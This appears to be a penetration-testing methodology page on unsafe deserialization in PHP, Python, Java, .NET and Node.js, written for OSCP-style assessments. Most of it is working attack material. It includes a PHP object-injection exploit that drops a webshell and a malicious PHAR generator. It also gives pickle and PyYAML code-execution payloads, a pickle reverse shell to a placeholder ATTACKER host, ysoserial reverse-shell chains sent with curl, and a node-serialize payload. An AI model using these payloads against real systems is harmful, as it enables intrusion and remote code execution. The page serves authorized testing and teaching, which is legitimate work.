# Deserialization

> Unsafe deserialization: attacker-controlled data is passed to a
> deserialization function that instantiates objects, leading to RCE.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. PHP Deserialization](#4-php-deserialization)
- [5. Python Deserialization](#5-python-deserialization)
- [6. Java Deserialization](#6-java-deserialization)
- [7. Other Languages](#7-other-languages)
- [8. Tools](#8-tools)
- [9. OSCP Notes](#9-oscp-notes)
- [10. Cheatsheet](#10-cheatsheet)
- [11. References](#11-references)

---

## 1. Overview

Deserialization = converting bytes back into in-memory objects. If those
bytes are attacker-controlled and the language allows object instantiation
from data, the attacker can construct arbitrary objects (gadget chains)
that execute code on deserialization.

**Signature (what to look for):**

| Language | Serialized format | Signature |
|----------|-------------------|-----------|
| PHP | serialize() output | O:4:"User":1:{...} |
| Python pickle | pickle.dumps output | starts with gAS or 0x80 0x04 |
| Java | ObjectOutputStream | hex AC ED 00 05 or base64 rO0AB |
| Ruby Marshal | Marshal.dump | starts with 0x04 0x08 |
| .NET | BinaryFormatter | base64 AAEAAAD///// |
| Node.js | node-serialize | JSON with _$$ND_FUNC$$_ |
| YAML | yaml.dump | --- or !!python/object |

**Where to look:**

- Cookies / session tokens (base64-encoded blobs).
- Hidden form fields (_token, state, viewstate).
- API bodies with opaque blobs.
- Cache / queue keys in Redis / RabbitMQ.
- File uploads parsed by the app.
- ViewState in ASP.NET.

**On OSCP:** deserialization appears with cookies (PHP/Java) or in
specific apps (Jenkins, WebLogic). Usually leads to direct RCE.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Decoding a serialized cookie (read only) | [PROD] |
| Modifying a serialized value (no RCE) | [PROD-RISK] |
| Deserialization RCE (id, whoami) | [PROD-NO] |
| Reverse shell | [PROD-NO] |
| Persistence via deserialization | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT trigger RCE without written approval.
- Do NOT persist.
- Do NOT modify serialized state that other users depend on.
- Do NOT run DoS payloads (some gadget chains are heavy).

In production, prove deserialization by decoding the blob and showing
you can alter a benign field.

---

## 3. Detection

### 3.1 Common locations

- Cookies: session=, data=, token=.
- Base64-encoded parameters.
- JSON with __type or _$$ND_FUNC$$_.
- Hidden form fields.
- ASP.NET __VIEWSTATE.

### 3.2 Signature recognition

```bash
# Base64 decode a suspicious blob
echo 'TzoxMzoiVXNlclByZWZzIjoyOntzOjc6InVzZXJuYW1lIjtzOjU6ImFkbWluIjt9' | base64 -d
# -> O:13:"UserPrefs":2:{s:8:"username";s:5:"admin";}
```

Signatures:

```text
PHP:   O:NN:"ClassName":...
Java:  rO0AB...  (base64)  or  AC ED 00 05 (hex)
Ruby:  BAh...
Python pickle: gAS...  or  0x80 0x04
.NET:  AAEAAAD/////
Node:  {"user":"_$$ND_FUNC$$_function(){...}"}
```

---

## 4. PHP Deserialization

### 4.1 The format

```php
// Serialized user object
$obj = new User("admin", "password");
echo serialize($obj);
// O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:8:"password";}
```

### 4.2 Magic methods

When unserialize() runs, these methods are called automatically:

| Method | Triggered by |
|--------|--------------|
| __wakeup() | unserialize() |
| __destruct() | object destruction |
| __toString() | string cast |
| __call() | unknown method call |
| __get() | unknown property access |

If any of these methods has a dangerous operation (file write, exec),
you can trigger it via a crafted serialized object.

### 4.3 Example: PHP object injection

Source:

```php
class FileLogger {
    public $logfile = '/tmp/app.log';
    public $content = '';
    function __destruct() {
        file_put_contents($this->logfile, $this->content);
    }
}
unserialize($_COOKIE['data']);
```

Exploit: write a webshell to /var/www/html/.

```php
class FileLogger {
    public $logfile = '/var/www/html/shell.php';
    public $content = '<?php system($_GET['c']); ?>';
}
echo urlencode(serialize(new FileLogger()));
```

Then:

```bash
curl -b 'data=O:10:"FileLogger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:7:"content";s:30:"<?php system($_GET["c"]); ?>";}' 'http://target/'
curl 'http://target/shell.php?c=id'
```

### 4.4 PHAR deserialization

PHP's phar:// wrapper deserializes metadata when a phar archive is
accessed. This means file_exists('phar://uploaded.phar') triggers
unserialize on the metadata.

```php
// Generate a malicious phar
$phar = new Phar('/tmp/payload.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$obj = new FileLogger();
$obj->logfile = '/var/www/html/shell.php';
$obj->content = '<?php system($_GET['c']); ?>';
$phar->setMetadata($obj);
$phar->stopBuffering();
```

Upload the phar, then trigger with any phar:// access:

```text
http://target/?file=phar:///var/www/uploads/payload.phar/test.txt
```

### 4.5 Tools

- PHPGGC: generate gadget chains for common frameworks (Laravel, Symfony, WordPress, Magento, Drupal).

```bash
phpggc -l
phpggc Monolog/RCE1 system id
phpggc Laravel/RCE1 system id -b
```

---

## 5. Python Deserialization

### 5.1 Pickle

Pickle is inherently unsafe. pickle.loads(attacker_data) = RCE.

**Generate payload:**

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

**Reverse shell:**

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i &> /dev/tcp/ATTACKER/4444 0&>1"',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

### 5.2 PyYAML

yaml.load() without Loader=SafeLoader executes !!python/object/apply:

```yaml
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
```

### 5.3 Detection

```bash
# Python pickle base64 often starts with gAS or gAJ
echo 'gASV...' | base64 -d | xxd | head
```

---

## 6. Java Deserialization

### 6.1 The format

Java serialized streams start with AC ED 00 05 (hex) = rO0AB (base64).

Detection:

```bash
# Base64 cookie starting with rO0AB is likely Java serialized
echo 'rO0ABXNy...' | base64 -d | xxd | head
```

### 6.2 ysoserial

ysoserial generates gadget chains for common Java libraries.

```bash
# List chains
java -jar ysoserial.jar

# Generate a CommonsCollections chain for a reverse shell
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9...}|{base64,-d}|{bash,-i}' > payload.bin

# Base64-encode for cookies
base64 -w0 payload.bin
```

Common chains:

| Chain | Library |
|-------|---------|
| CommonsCollections1-7 | Apache Commons Collections |
| CommonsBeanutils1 | Apache Commons BeanUtils |
| Groovy1 | Groovy |
| Spring1, Spring2 | Spring Framework |
| Hibernate1 | Hibernate |
| JRMPClient | RMI |

### 6.3 Detection script

**ysoserial + base64 + curl:**

```bash
java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin
PAYLOAD=$(base64 -w0 payload.bin)
curl -b "session=$PAYLOAD" 'http://target/'
```

### 6.4 Burp extension

Java Deserialization Scanner (Burp BApp) automates detection + payload.

---

## 7. Other Languages

| Language | Format | Tool |
|----------|--------|------|
| Ruby Marshal | Binary starting with 0x04 0x08 | Marshal.load gadget chains (Rails) |
| .NET BinaryFormatter | Base64 starting with AAEAAAD///// | ysoserial.net |
| Node.js node-serialize | JSON with _$$ND_FUNC$$_ | node-serialize RCE |
| Node.js serialize-to-js | JSON with functions | Similar |

### 7.1 .NET ysoserial

```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'powershell -e BASE64' -o base64
```

### 7.2 Node.js node-serialize

```json
{"user":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)})}()"}
```

---

## 8. Tools

| Tool | Purpose |
|------|---------|
| ysoserial | Java gadget chains |
| ysoserial.net | .NET gadget chains |
| PHPGGC | PHP gadget chains |
| Java Deserialization Scanner | Burp extension |
| marshalsec | Java RMI / JNDI / LDAP exploitation |

Examples:

```bash
# PHPGGC list
phpggc -l

# ysoserial basic
java -jar ysoserial.jar CommonsCollections6 'id'

# ysoserial.net
ysoserial.exe -g ObjectDataProvider -f Json.Net -c 'calc.exe'
```

---

## 9. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the encoded payload (base64 cookie, hidden field).
> - Screenshot the request that triggers deserialization.
> - Screenshot the RCE output (id / whoami).
> - If reverse shell, screenshot the shell connection.
>
> Deserialization RCE is a direct foothold. Show the chain from the
> encoded blob to the shell.
>
> See [../../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 10. Cheatsheet

```bash
# Decode a blob
echo 'BASE64' | base64 -d

# PHP: PHPGGC
phpggc -l
phpggc Monolog/RCE1 system id -b

# Java: ysoserial
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0

# .NET: ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'calc' -o base64
```

```python
# Python pickle RCE
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

```yaml
# PyYAML RCE
!!python/object/apply:os.system ["id"]
```

```text
Signatures:
PHP:    O:NN:"Class":...
Java:   rO0AB...  (base64)
Ruby:   BAh...
.NET:   AAEAAAD/////
Node:   _$$ND_FUNC$$_
Python: gAS...  or  0x80 0x04
```

---

## 11. References

- OWASP Deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
- PortSwigger deserialization: https://portswigger.net/web-security/deserialization
- ysoserial: https://github.com/frohoff/ysoserial
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- PHPGGC: https://github.com/ambionics/phpggc
- marshalsec: https://github.com/mbechler/marshalsec

> See also: [../06 Technologies/JWT.md](../06%20Technologies/JWT.md), [../04 Servers/Tomcat.md](../04%20Servers/Tomcat.md), [../03 Languages/Java.md](../03%20Languages/Java.md)

---

*Part of MethodMan. English only by design. Last updated: 2026-10-11.*
